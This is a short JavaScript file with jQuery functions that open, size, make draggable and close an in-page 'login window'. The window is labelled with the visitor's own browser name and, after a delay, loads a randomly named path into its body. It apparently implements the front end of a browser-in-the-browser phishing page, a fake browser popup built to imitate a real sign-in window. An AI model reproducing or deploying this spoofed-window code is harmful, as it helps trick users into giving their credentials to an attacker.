function randomId(len) {
    var text = '';
    var possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0; i < len; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length))
    }
    return text
}
function closeLoginWindow() {
	$('#new-window').css({
		display: 'none',
	});
	$('.window-body-data').html('').prop('src', '')
}
function login() {
    var browserName = '';
    var w = $(window).width() * 0.75;
    var h = $(window).height() * 0.9;
    switch (bowser.name) {
		case 'Chrome':
			browserName = 'Google Chrome';
			break;
		case 'Firefox':
			browserName = 'Mozilla Firefox';
			break
    }
    browserName = (browserName === '') ? bowser.name : browserName;
    $('#browser-name').text(browserName);
    $('#new-window').css({
        width: w,
        height: h,
        display: 'block',
    });
    $('#new-window').draggable({
        containment: 'window',
    });
    $('.window-header-close').click(function() {
        $(this).off('click');
		closeLoginWindow()
    });
    setTimeout(function() {
        $('.window-body-data').prop('src', '/' + randomId(40))
    }, 1200)
}